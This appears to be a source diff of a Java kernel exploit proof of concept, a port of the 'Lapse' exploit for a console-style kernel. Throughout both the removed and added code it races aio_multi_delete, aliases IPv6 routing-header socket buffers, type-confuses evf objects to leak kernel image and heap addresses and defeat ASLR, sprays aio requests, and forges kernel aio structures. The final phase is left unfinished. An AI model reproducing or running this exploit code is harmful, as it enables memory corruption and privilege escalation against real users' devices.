-				socket.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBuf);
-				int marker = aliasRthdrBuf.getInt(markerOffset);
-				if (marker != iSocket) {
-					Console.log("-> marker " + marker + " != isocket " + iSocket);
-					// Save aliased socket pair
-					aliasSocketPair[0] = sockets[iSocket];
-					aliasSocketPair[1] = sockets[marker];
-					// Replace them with new ones in the sockets array
-					sockets[iSocket] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
-					sockets[marker]  = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
-					int fd0 = aliasSocketPair[0].fd, fd1 = aliasSocketPair[1].fd;
-					Console.log("-> aliased rthdr socket fds: " + fd0 + ", " + fd1);
-					aliasSocketPairFound = true;
+			evfs = null;
+		}
+	}
+
+	private class BreakASLR extends Phase {
+		/** Socket with ip6_rthdr struct aliased with inEvf's kernel memory */
+		public Socket inSocket;
+		/** Handle of evf struct aliased with inSocket's ip6_rthdr in kernel memory */
+		public Evf inEvf;
+
+		/** Address inside kernel image of "evf cv" string */
+		public long outKernelImageAddr;
+		/** Address inside kernel heap of inEvf backing struct */
+		public long outKernelHeapAddr;
+
+		public void run() throws Throwable {
+			// Structure of evf as documented by lapse.mjs:
+			//  offset 0x0:  u64 flags
+			//  offset 0x28: struct cv cv - first field is char* cv_description, always "evf cv"
+			//  ^ this points to an address in the kernel image
+			//  offset 0x38: TAILQ_HEAD(struct evf_waiter) waiters - ???
+			//  ^ this points to an address in the kernel heap (?)
+
+			// Structure of ip6_rthdr, honestly not sure where this is documented:
+			//  offset 0x0: ip6r_next
+			//  offset 0x1: ip6r_len
+			//  offset 0x2: ip6r_type
+			//  offset 0x3: ip6r_segleft
+
+			// Enlarge the rthdr by writing to its len field via the evf flags field
+			inEvf.set(0xff << 8);
+
+			// We can then leak the full contents of the evf struct
+			final int MALLOC_SIZE = 0x80;
+			final int LEAK_LEN = 16; // in MALLOC_SIZE blocks
+			final int LEAK_SIZE = MALLOC_SIZE * LEAK_LEN; // overallocated? this is 2048 bytes
+			Buffer buf = new Buffer(LEAK_SIZE);
+			log("BreakASLR: leaking evf struct via getsockopt");
+			inSocket.getRthdr(buf);
+			log(hexdump(buf, "-> "));
+
+			// Get the address of the "evf cv" string
+			outKernelImageAddr = buf.getLong(0x28);
+
+			// From lapse.mjs: because of TAILQ_INIT(), we have:
+			//  evf.waiters.tqh_last == &evf.waiters.tqh_first
+			// We now know the address of the kernel buffer we are leaking
+			outKernelHeapAddr = buf.getLong(0x40) - 0x38;
+
+			log("BreakASLR: kernel image address: 0x" + Console.hex(outKernelImageAddr));
+			log("BreakASLR: kernel heap  address: 0x" + Console.hex(outKernelHeapAddr));
+		}
+	}
+
+	class LeakAioEntry extends Phase {
+		public long inKernelImageAddr;
+		public long inKernelHeapAddr;
+		public Socket inSocket;
+
+		public long outAioEntryAddr;
+
+		public void run() throws Throwable {
+			// FIXME: These comments are just copy-pasted from lapse.mjs, fix them up
+			// 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
+			// allocate reqs1 arrays at 0x100 malloc zone
+			final int NUM_ELEMS = 6;
+			// use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of the reqs2 so
+			// so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
+			long ucred = inKernelHeapAddr + 4;
+
+			// FIXME: In lapse.mjs this is the same constant used for NUM_EVFS here
+			// Move to global scope? But I don't yet understand why lapse.mjs uses it here.
+			final int NUM_HANDLES = 256;
+
+			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_ELEMS);
+			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_HANDLES * NUM_ELEMS);
+			reqs.initMinimal();
+
+			// FIXME: Same as in BreakASLR, move to global scope?
+			final int MALLOC_SIZE = 0x80;
+			final int LEAK_LEN = 16; // in MALLOC_SIZE blocks
+			final int LEAK_SIZE = MALLOC_SIZE * LEAK_LEN; // overallocated? this is 2048 bytes
+			Buffer buf = new Buffer(LEAK_SIZE);
+
+			final int NUM_ATTEMPTS = 20; // FIXME: lapse.mjs does 6
+			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+				Console.log("LeakAioEntry: attempt " + attempt);
+
+				inSocket.getRthdr(buf);
+
+				// spray_aio (note lapse.mjs specifically uses WRITE here, not sure if it matters)
+				for (int i = 0; i < NUM_HANDLES; i++) {
+					AioSubmitIdArray batchIds = ids.slice(i * NUM_HANDLES, NUM_HANDLES);
+					k.aioSubmitCmd(k.AIO_CMD_MULTI_WRITE, reqs, batchIds);
+				}
+
+				inSocket.getRthdr(buf);
+
+				boolean verified = false;
+				int offset = 0;
+				for (int i = 0; i < buf.size(); i += 0x80) {
+					// lapse.mjs calls this entire block verify_reqs2
+					// FIXME: move into a utility function maybe?
+					if (buf.getInt(i) != LibKernel.AIO_CMD_WRITE) {
+						continue; // try verify_reqs2 with another offset
+					}
+					// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx
+					// with xxxx randomized on boot
+					short heapPrefix = 0;
+					// Check if offsets 0x10 to 0x20 look like a kernel heap address
+					boolean found = false;
+					for (int j = 0x10; j <= 0x20; j += 8) {
+						if (buf.getShort(i + j + 6) != 0xffff) {
+							found = false; // can stop looking
+							break;
+						}
+						heapPrefix = buf.getShort(i + j + 4);
+						found = true;
+					}
+					if (!found) {
+						continue; // try verify_reqs2 with another offset
+					}
+					// Check reqs2.ar2_result.state. It's a 32-bit value but the allocated memory
+					// was initialized with zeroes so all padding bytes must be 0.
+					int state = buf.getInt(i + 0x38);
+					int padding = buf.getInt(i + 0x38 + 4);
+					if (!(0 < state && state <= 4) || padding != 0) {
+						continue; // try verify_reqs2 with another offset
+					}
+					// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
+					long file = buf.getLong(i + 0x40);
+					if (file != 0) {
+						continue; // try verify_reqs2 with another offset
+					}
+					// Check if offsets 0x48 to 0x50 look like a kernel address
+					found = false;
+					for (int j = 0x48; j <= 0x50; j += 8) {
+						if (buf.getShort(i + j + 6) == 0xffff) {
+							// Ignore kernel ELF addresses
+							if (buf.getShort(i + j + 4) != 0xffff) {
+								if (buf.getShort(i + j + 4) == heapPrefix) {
+									found = true;
+								}
+							}
+							// offset 0x48 can be NULL
+						} else if (i == 0x50 || buf.getLong(i + j) != 0) {
+							found = false;
+							break; // can stop looking
+						}
+					}
+					if (!found) {
+						continue; // try verify_reqs2 with another offset
+					}
+					verified = true;
+					offset = i;
+					break;
+				}
+
+				k.aioUtilBatchCancelPollDelete(ids);
+
+				if (verified) {
+					outAioEntryAddr = buf.address() + offset;
+					Console.log("-> found reqs2 at 0x" + Console.hex(outAioEntryAddr));
 					break;
 				}
 			}
-			Console.log("-> clear other rthdrs");
-			// Clear rthdrs for everything other than the aliased pair
-			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
-				Socket socket = sockets[iSocket];
-				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, new Buffer(0, 0));
-			}
-			if (aliasSocketPairFound) {
-				break;
-			}
-		}
-
-		if (!aliasSocketPairFound) {
-			Console.log("Lapse: couldn't make aliased rthdrs in " + NUM_RTHDR_ALIAS_TRIES + " tries");
-			return;
-		}
-
-		// MEMLEAK: If we won the race, aio_obj.ao_num_reqs got decremented twice.
-		// So this call will leave the kernel-side struct for one request undeleted.
-		k.aioMultiDelete(ids, null);
-		Console.log("-> aioMultiDelete " + ids.count + " ids (0x" +
-			Long.toHexString(ids.address()) + ") done");
-
-		// *****************************************************************************************
-		// Step 2: Leak kernel addresses using the aliased socket pair
-		// *****************************************************************************************
-
-		Console.log("Lapse: leaking kernel addresses");
-
-		final int LEAK_LEN = 16;
-		Buffer leakBuf = new Buffer(RTHDR_SIZE * LEAK_LEN);
-		leakBuf.fill((byte)0);
-		Buffer leakBufRthdrSized = new Buffer(leakBuf.address(), RTHDR_SIZE);
-
-		// I have no idea what the fuck an evf is.
-		// Syscall signatures as documented by lapse.mjs (which mismatches psdevwiki, btw):
-		//  int evf_create(char *name, uint32_t attributes, uint64_t flags) -- returns id
-		//  int evf_set(int id, uint64_t flags)
-		//  int evf_clear(int id)
-		//  int evf_delete(int id)
-
-		// The point of this step is to leak the contents of the rthdr I guess?
-		Console.log("-> type-confuse struct evf with struct ip6_rthdr");
-
-		// Free one rthdr
-		Socket sd = aliasSocketPair[0];
-		Console.log("-> close socket fd " + aliasSocketPair[1].fd + " & keep fd " + sd.fd);
-		aliasSocketPair[1].close();
-
-		final int NUM_LEAK_TRIES = 100;
-		final int NUM_EVFS = 0x100;
-		Evf[] evfs = new Evf[NUM_EVFS];
-		Evf confusedEvf = null;
-
-		for (int iTry = 0; iTry < NUM_LEAK_TRIES; iTry++) {
-			// Reclaim freed rthdr with evf object
-			Console.log("Lapse: rthdr/evf alias attempt " + iTry);
-			Console.log("-> create new evfs with flags 0xf00 | (i << 16)");
-			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
-				// From lapse.mjs: flags must be set to >= 0xf00 to fully leak contents of rthdr
-				int flags = 0xf00 | (iEvf << 16);
-				evfs[iEvf] = k.new Evf(0, flags);
-			}
-
-			// In Lapse: get_rthdr(sd, buf, 0x80)
-			Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
-			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
-
-			// Check required because sometimes we read values way out of bounds?
-			// I don't really understand what we're reading from leakBuf anyway
-			int flags = leakBuf.getInt(0);
-			if ((flags & 0xf00) == 0xf00) {
-				int idx = flags >> 16;
-				Evf evf = evfs[idx];
-				Console.log("-> read flags 0x" + Integer.toHexString(flags) + " idx " + idx);
-
-				// This set changes the rthdr length I guess?
-				int expectedFlags = flags | 1;
-				evf.set(expectedFlags);
-				Console.log("-> set flags 0x" + Integer.toHexString(expectedFlags));
-
-				// In Lapse: get_rthdr(sd, buf, 0x80)
-				Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
-				sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
-
-				// Check if we've done anything interesting
-				int newFlags = leakBuf.getInt(0);
-				if (newFlags == expectedFlags) {
-					Console.log("-> type-confusion successful on attempt " + iTry);
-					confusedEvf = evfs[idx];
-					evfs[idx] = null;
-				} else {
-					Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(newFlags));
-				}
-			} else {
-				Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(flags));
-			}
-
-			Console.log("-> deleting other evfs");
-			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
-				if (evfs[iEvf] != null) {
-					evfs[iEvf].delete();
-				}
-			}
-
-			if (confusedEvf != null) break;
-		}
-
-		if (confusedEvf == null) {
-			Console.log("Lapse: couldn't leak kernel addresses in " + NUM_LEAK_TRIES + " tries");
-			return;
-		}
-
-		// ip6_rthdr and evf obj are overlapped by now
-		// enlarge ip6_rthdr by writing to its len field by setting the evf's flag
-		Console.log("-> enlarging ip6_rthdr");
-		confusedEvf.set(0xff << 8);
-
-		// Structure of evf as documented by lapse.mjs:
-		//  offset 0x0:  u64 flags
-		//  offset 0x28: struct cv cv - first field is char* cv_description, always "evf cv"
-		//  offset 0x38: TAILQ_HEAD(struct evf_waiter) waiters - what even...
-
-		// Now we can get an address inside the kernel's mapped ELF file via evf.cv.cv_description
-		// I guess the point of all of this is to defeat ASLR?
-		long keEvfCvDescAddr = leakBuf.getLong(0x28);
-		Console.log("-> leaked kernel address of 'evf cv': 0x" + Long.toHexString(keEvfCvDescAddr));
-
-		// From lapse.mjs: because of TAILQ_INIT(), we have:
-		//  evf.waiters.tqh_last == &evf.waiters.tqh_first
-		// We now know the address of the kernel buffer we are leaking
-
-		long keLeakBufAddr = leakBuf.getLong(0x40) - 0x38;
-		Console.log("-> leaked kernel address of buffer: 0x" + Long.toHexString(keLeakBufAddr));
-
-		// 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
-		// Allocate reqs1 arrays at 0x100 malloc zone
-		final int NUM_ELEMS = 6;
-		AioRWRequestArray leakReqs = k.new AioRWRequestArray(NUM_ELEMS);
-		for (int i = 0; i < leakReqs.count; i++) { leakReqs.get(i).fd.set(-1); } // make_reqs1
-
-		// Use reqs1 to fake an aio_info. Set .ai_cred (offset 0x10) to offset 4 of the reqs2 so
-		// crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
-		leakReqs.buffer.putLong(0x10, keLeakBufAddr + 4);
-
-		Console.log("-> find aio_entry");
-
-		final int NUM_FIND_AIO_ENTRY_TRIES = 100;
-		long reqs2Offset = 0;
-		AioSubmitIdArray leakIds = k.new AioSubmitIdArray(NUM_EVFS * NUM_ELEMS);
-
-		for (int i = 0; i < NUM_FIND_AIO_ENTRY_TRIES; i++) {
-			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
-
-			// spray_aio
-			int idsOffset = 0, idsStep = NUM_ELEMS;
-			for (int j = 0; j < NUM_EVFS; j++) {
-				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, leakReqs, leakIds.slice(idsOffset, idsStep));
-				idsOffset += idsStep;
-			}
-
-			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
-
-			for (int offset = 0x80; offset < leakBuf.size() - RTHDR_SIZE; offset++) {
-				// lapse.mjs calls this entire block verify_reqs2
-				if (leakBuf.getInt(offset) == LibKernel.AIO_CMD_WRITE) {
-					continue;
-				}
-
-				// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx with
-				// xxxx randomized on boot.
-				short heapPrefix = 0;
-
-				// Check if offsets 0x10 to 0x20 look like a kernel heap address
-				boolean foundKernelHeapAddr = false;
-				for (int offset2 = 0x10; offset2 <= 0x20; offset2 += 8) {
-					if (leakBuf.getShort(offset + offset2 + 6) != 0xffff) {
-						foundKernelHeapAddr = false; // can stop looking
-						break;
-					}
-					heapPrefix = leakBuf.getShort(offset + offset2 + 4);
-					foundKernelHeapAddr = true;
-				}
-				if (!foundKernelHeapAddr) {
-					continue; // try verify_reqs2 with another offset
-				}
-
-				// Check reqs2.ar2_result.state. It's a 32-bit value but the allocated memory was
-				// initialized with zeroes so all padding bytes must be 0.
-				int state = leakBuf.getInt(offset + 0x38);
-				int padding = leakBuf.getInt(offset + 0x38 + 4);
-				if (!(0 < state && state <= 4) || padding != 0) {
-					continue; // try verify_reqs2 with another offset
-				}
-
-				// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
-				long file = leakBuf.getLong(offset + 0x40);
-				if (file != 0) {
-					continue; // try verify_reqs2 with another offset
-				}
-
-				// Check if offsets 0x48 to 0x50 look like a kernel address
-				foundKernelHeapAddr = false;
-				for (int offset2 = 0x48; offset2 <= 0x50; offset2 += 8) {
-					if (leakBuf.getShort(offset + offset2 + 6) == 0xffff) {
-						// Don't push kernel ELF addresses
-						if (leakBuf.getShort(offset + offset2 + 4) != 0xffff) {
-							if (leakBuf.getShort(offset + offset2 + 4) == heapPrefix) {
-								foundKernelHeapAddr = true;
-							}
-						}
-						// offset 0x48 can be NULL
-					} else if (i == 0x50 || leakBuf.getLong(offset + offset2) != 0) {
-						foundKernelHeapAddr = false;
-						break; // can stop looking
-					}
-				}
-				if (!foundKernelHeapAddr) {
-					continue; // try verify_reqs2 with another offset
-				}
-
-				reqs2Offset = offset;
-				break;
-			}
-
-			if (reqs2Offset == 0) {
-				continue; // next attempt
-			}
-
-			Console.log("-> found reqs2 at 0x" + Console.hex(leakBuf.address() + reqs2Offset) + " on attempt " + i);
-
-			// free_aios
-			try {
-				k.aioMultiCancel(leakIds, null);
-				k.aioMultiPoll(leakIds, null);
-				k.aioMultiDelete(leakIds, null);
-			} catch (Throwable e) {}
-		}
-
-		if (reqs2Offset == 0) {
-			Console.log("-> failed to find reqs2 after " + NUM_FIND_AIO_ENTRY_TRIES + " attempts");
-			return;
-		}
-
-		sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
-		Console.log("-> leaked aio_entry:");
-		for (int offset = 0; offset <= 0x80; offset += 16) {
-			StringWriter sw = new StringWriter();
-			for (int i = 0; i < 16; i++) {
-				String hex = Console.hex(leakBuf.getByte(offset + i));
-				if (hex.length() == 1) { sw.write('0'); }
-				sw.write(hex);
-				sw.write(' ');
-			}
-			Console.log("-> " + sw.toString());
-		}
-
-		Console.log("Lapse: end of PoC");
-	}
-
-	private class RaceThread extends Thread {
-		private PthreadBarrier barrier;
-		private AioSubmitIdArray ids;
-		private AioErrorArray errors;
-
-		public RaceThread(PthreadBarrier barrier, AioSubmitIdArray ids, AioErrorArray errors) {
-			this.barrier = barrier;
-			this.ids = ids;
-			this.errors = errors;
-		}
-
-		public void run() {
-			// Not sure if this is a good idea but whatever
-			// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);
-
-			// Sync point between threads
-			barrier.barrierWait();
-
-			// Hopefully both threads will call aio_multi_delete at the same time
-			k.aioMultiDelete(ids, errors);
 		}
 	}
 
-	private void cleanup() {
-		// k.cpuSetAffinityForCurrentThread(initialCPUAffinity);
-		for (int i = 0; i < sockets.length;    i++) sockets   [i].close();
-		for (int i = 0; i < socketsAlt.length; i++) socketsAlt[i].close();
-		k.aioMultiCancel(ids, null);
+	class AliasAioRthdr extends Phase {
+		public Evf inEvf;
+		public Socket inSocket;
+		public long inKernelHeapAddr;
+		public long inKernelImageAddr;
+		public long inAioEntryAddr;
+
+		public void run() throws Throwable {
+			final int MAX_LEAK_LEN = (0xff + 1) << 3; // FIXME: why?
+			Buffer buf = new Buffer(MAX_LEAK_LEN);
+
+			final int NUM_ELEMS = LibKernel.MAX_AIO_IDS;
+			final int NUM_BATCHES = 2;
+			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_ELEMS);
+			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_BATCHES * NUM_ELEMS);
+			reqs.initMinimal();
+
+			final int NUM_ATTEMPTS = 100; // FIXME: lapse.mjs sets this to 8 (num_clobbers)
+			boolean successful = false;
+
+			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+				Console.log("AliasAioRthdr: attempt " + attempt);
+
+				// spray_aio
+				for (int i = 0; i < NUM_BATCHES; i++) {
+					AioSubmitIdArray batchIds = ids.slice(i * NUM_BATCHES, NUM_BATCHES);
+					k.aioSubmitCmd(k.AIO_CMD_MULTI_READ, reqs, batchIds);
+				}
+
+				int written = inSocket.getRthdr(buf);
+				if (written == 8 && buf.getInt(0) == k.AIO_CMD_READ) {
+					Console.log("-> aliased");
+					successful = true;
+					k.aioUtilBatchCancel(ids, null);
+					break;
+				}
+
+				k.aioUtilBatchCancelPollDelete(ids);
+			}
+
+			if (!successful) {
+				throw new Exception("AliasAioRthdr: failed");
+			}
+
+			final int MALLOC_SIZE = 0x80;
+			Buffer reqs2 = new Buffer(MALLOC_SIZE);
+
+			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
+			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
+			final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
+			final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
+			reqs2.putByte(0, (byte)0);                // ip6r_next
+			reqs2.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
+			reqs2.putByte(2, (byte)0);                // ip6r_type
+			reqs2.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft
+
+			// Construct an aio_batch at the end of the buffer
+			final int REQS3_OFFSET = 0x28;
+			Buffer reqs3 = new Buffer(reqs2.address() + REQS3_OFFSET, 0x80 - REQS3_OFFSET);
+
+			// Aliasing SceAioRWRequest(?)
+			// FIXME: Is this documented literally anywhere?
+			reqs2.putInt(4, 5);                                   // ar2_ticket
+			reqs2.putLong(0x18, inAioEntryAddr);                  // ar2_info
+			reqs2.putLong(0x20, inKernelHeapAddr + REQS3_OFFSET); // ar2_batch
+
+			// [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
+			// safe since free_queue_entry() doesn't deref the pointer
+			reqs3.putInt(0, 1); // ar3_num_reqs(?)
+			reqs3.putInt(4, 0); // ar3_reqs_left(?)
+			// [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
+			reqs3.putInt(8, k.AIO_STATE_COMPLETED); // ar3_state
+			reqs3.putByte(0xc, (byte)0);            // ar3_done
+			// .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
+			// safe since the entry already got dequeued
+			// .ar3_lock.lock_object.lo_flags =
+			//   LO_SLEEPABLE | LO_UPGRADABLE | LO_RECURSABLE | LO_DUPOK | LO_WITNESS |
+			//   6 << LO_CLASSSHIFT | LO_INITIALIZED
+			reqs3.putInt(0x28, 0x67b0000); // .ar3_lock.lock_object_lo_flags
+			reqs3.putLong(0x38, 1);        // .ar3_lock.lk_lock = LK_UNLOCKED
+
+			AioSubmitIdArray states = k.new AioSubmitIdArray(NUM_ELEMS);
+
+			// FIXME: Just keep going...
+		}
+	}
+
+	public String hexdump(Buffer buf, String indent) {
+		final int BYTES_PER_LINE = 32;
+		long lastLineAddr = Math.max(BYTES_PER_LINE, buf.address() + buf.size());
+		int lastLineAddrWidth = Long.toHexString(lastLineAddr).length();
+		StringBuffer sb = new StringBuffer();
+		for (long i = buf.address(); i < buf.address() + buf.size(); i += BYTES_PER_LINE) {
+			sb.append(indent);
+			sb.append("0x");
+			sb.append(leftpad(Long.toHexString(i), '0', lastLineAddrWidth));
+			sb.append(": ");
+			for (long j = 0; j < BYTES_PER_LINE; j++) {
+				byte b = api.read8(i + j);
+				sb.append(Character.forDigit((b & 0xF0) >> 8, 16));
+				sb.append(Character.forDigit((b & 0x0F) >> 0, 16));
+				sb.append(' ');
+			}
+			sb.append('\n');
+		}
+		return sb.toString();
+	}
+
+	public String leftpad(String str, char fill, int width) {
+		while (str.length() < width) {
+			str = fill + str;
+		}
+		return str;
 	}
 }
